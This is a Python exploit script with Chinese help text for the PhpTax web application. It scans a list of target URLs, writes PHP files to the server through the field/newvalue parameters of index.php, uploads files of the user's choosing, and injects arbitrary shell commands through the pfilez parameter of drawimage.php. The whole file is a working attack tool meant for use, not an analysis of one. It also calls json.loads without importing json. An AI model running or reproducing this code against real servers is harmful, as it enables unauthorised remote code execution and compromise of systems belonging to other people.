#!/usr/bin/python3
import requests
import argparse
import urllib.parse
import time

parser=argparse.ArgumentParser(description="phptax Exploit    --By Infiltrator",epilog="GitHub:https://github.com/nhpt")

group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-u',help='目标URL，如:http://www.test.com/phptax')
group.add_argument('-f',type=argparse.FileType('r',encoding='utf8'),help='目标URL文件')

parser.add_argument('-p',help='代理地址，如：http://127.0.0.1:8080')
parser.add_argument('-H',help='HTTP Headers，如：{"X-Forwarded-For":"127.0.0.1"}')
parser.add_argument('-t',help='超时时间，单位：秒')
parser.add_argument('-uf',type=argparse.FileType('r',encoding='utf8'),help='上传文件')
parser.add_argument('-e',help="执行命令（无回显），需进行url编码")
parser.add_argument('-o', type=argparse.FileType('w', encoding='UTF-8'),help='保存扫描结果到文本文件')

args=parser.parse_args()
requests.packages.urllib3.disable_warnings()

timeout=None
proxies=None
head = {
    "User-Agent":"Mozilla/4.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}
rand_sum='b4a06832f3'+str(time.time()).split('.')[1]
def proxy(proxy):
    try:
        key=proxy.split('://')[0]
        return {key:proxy}
    except:
        exit('[!] 代理地址格式有误！')

def headers(header):
    try:
        headers=json.loads(header)
        return headers
    except:
        exit('[!] HTTP请求头格式有误！')

def newvalue_rce(url):
    # 上传文件
    if args.uf:
        try:
            requests.get(url+'/index.php?field='+args.uf.name+'&newvalue='+urllib.parse.quote_plus(args.uf.read()),headers=head,proxies=proxies,timeout=timeout,verify=False)
            r=requests.get(url+'/data/'+args.uf.name,headers=head,proxies=proxies,timeout=timeout,verify=False)
            if r.status_code!=404:
                print('[+] 上传成功：',url+'/data/'+args.uf.name)
        except:
            pass
    else:
        # 检测漏洞
        createfile_url=url+'/index.php?field='+rand_sum+'.php&newvalue=<?php echo '+rand_sum+';?>'
        try:
            requests.get(createfile_url,headers=head,proxies=proxies,timeout=timeout,verify=False)
        except:
            pass
        try:
            r=requests.get(url+'/data/'+rand_sum+'.php',headers=head,proxies=proxies,timeout=timeout,verify=False)
            if r.status_code==200 and rand_sum in r.text:
                print("[+] 存在文件操作（newvalue，field）远程代码执行漏洞！",url+'/data/'+rand_sum+'.php')
                if args.o:
                    args.o.write('文件操作（newvalue，field）远程代码执行漏洞    '+url+'\n')
        except:
            pass



def pfilez_commandInjection(url):
    # 执行命令
    if args.e:
        try:
            r=requests.get(url+'/drawimage.php?pdf=make&pfilez=xxx;'+args.e,headers=head,proxies=proxies,timeout=timeout,verify=False)
            if r.status_code==200:
                print("[+] 命令执行成功！",url+'/drawimage.php?pdf=make&pfilez=xxx;'+args.e)
        except:
            pass
    else:
        # 检测漏洞
        cmd_url=url+'/drawimage.php?pdf=make&pfilez=xxx;echo '+rand_sum+' >'+rand_sum+'.php'
        try:
            requests.get(cmd_url,headers=head,proxies=proxies,timeout=timeout,verify=False)
        except:
            pass
        try:
            r=requests.get(url+'/'+rand_sum+'.php',headers=head,proxies=proxies,timeout=timeout,verify=False)
            if r.status_code==200 and rand_sum in r.text:
                print("[+] 存在pfilez命令注入漏洞！",url+'/'+rand_sum+'.php')
                if args.o:
                    args.o.write('pfilez命令注入漏洞    '+url+'\n')
        except:
            pass

if args.p:
    proxies=proxy(args.p)
if args.H:
    head=headers(args.H)
if args.t:
    timeout=float(args.t)
if args.u:
    urls=[args.u]
else:
    urls=[x.strip('\n') for x in args.f.readlines()]
print(args.e)
for u in urls:
    if args.uf:
        newvalue_rce(u)
    elif args.e:
        pfilez_commandInjection(u)
    else:
        newvalue_rce(u)
        pfilez_commandInjection(u)